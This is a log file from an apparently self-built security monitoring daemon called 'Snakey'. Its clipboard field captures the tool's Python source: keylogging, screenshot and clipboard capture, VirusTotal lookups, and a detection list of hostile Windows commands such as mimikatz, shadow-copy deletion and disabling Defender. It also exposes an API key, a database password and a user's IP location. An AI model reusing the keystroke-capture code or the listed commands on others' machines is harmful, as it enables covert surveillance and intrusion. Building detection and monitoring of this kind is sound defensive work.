session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information)  # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(\r\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(\r\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        nonlocal keys  # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:  # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener:  # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log  # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(),\r\n                                # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()  # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(3)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa7e5b21da57914f38389845b114538f80d2abe45c8e88b17ceb214da1099591", "screenshot_hash": "4f8f00af0d6d4e3a3aaae9c1af1bc9b41446c6992057e654d124573d029638bc", "_raw_log_hash": "9129f7772d224bf978f35ac4f365312e51dee62ae2259c0f53d84de907fc606e"}
{"timestamp": "2025-06-11T16:56:03.209842+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\nimport traceback # Added for detailed error logging\r\n\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\r\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\r\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\r\n\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",  # Formatting drives\r\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\r\n    \"net user\",  # User management (info or creation)\r\n    \"net localgroup administrators\",  # Admin group checks\r\n    \"taskkill /f /im\",  # Force kill process by image name\r\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\r\n    \"reg delete\",  # Delete registry keys\r\n    \"mimikatz\",  # Credential dumping tool\r\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",  # Download files via BITS\r\n    \"wevtutil cl system\",  # Clear event logs\r\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",  # Secure delete tool\r\n]\r\n\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())  # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())  # Still print even if file write fails\r\n\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use verify=False here as well, consistent with Elasticsearch client config\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                            verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a byte to force connection establishment, then close to prevent hanging\r\n    try:\r\n        response.raw.read(1)\r\n    except Exception as read_e:\r\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n    traceback.print_exc() # <-- Added traceback\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # This disables SSL certificate verification\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:  # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\",\r\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n            traceback.print_exc()\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n            traceback.print_exc()\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n            traceback.print_exc() # <-- Added traceback\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === New: Check Country Change Function ===\r\ndef 